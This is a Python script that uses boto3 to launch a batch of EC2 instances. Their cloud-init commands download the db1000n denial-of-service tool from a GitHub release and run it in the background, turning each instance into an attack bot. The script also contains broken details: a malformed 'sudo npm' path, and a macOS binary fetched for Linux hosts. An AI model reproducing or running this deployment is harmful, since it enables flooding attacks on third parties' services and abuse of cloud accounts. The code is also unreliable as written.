import sys
import boto3
ec2 = boto3.resource('ec2')
instance_id = str(sys.argv[1])
instance_count = int(sys.argv[2])
instance_region = sys.argv[3]

userdata = """#cloud-config
    runcmd:
     - /home/ec2-user/sudo npm run prod
     - cd /tmp
     - yum update -y
     - dd if=/dev/zero of=/swapfile bs=128M count=32
     - chmod 600 /swapfile
     - mkswap /swapfile
     - swapon /swapfile
     - echo "/swapfile swap swap defaults 0 0"|tee -a /etc/fstab
     - wget https://github.com/Arriven/db1000n/releases/download/v0.8.8/db1000n_0.8.8_darwin_amd64.tar.gz
     - tar -xf db1000n_0.8.8_darwin_amd64.tar.gz
     - chmod +x db1000n
     - nohup ./db1000n &
"""

instances = ec2.create_instances(
    ImageId=instance_id,
    MinCount=instance_count,
    MaxCount=instance_count,
    InstanceType='t2.micro',
    KeyName='ec2-keypair',
    UserData=userdata
 )

for instance in instances:
    print(f'EC2 instance "{instance.id}" has been launched')

    instance.wait_until_running()
    print(f'EC2 instance "{instance.id}" has been started')


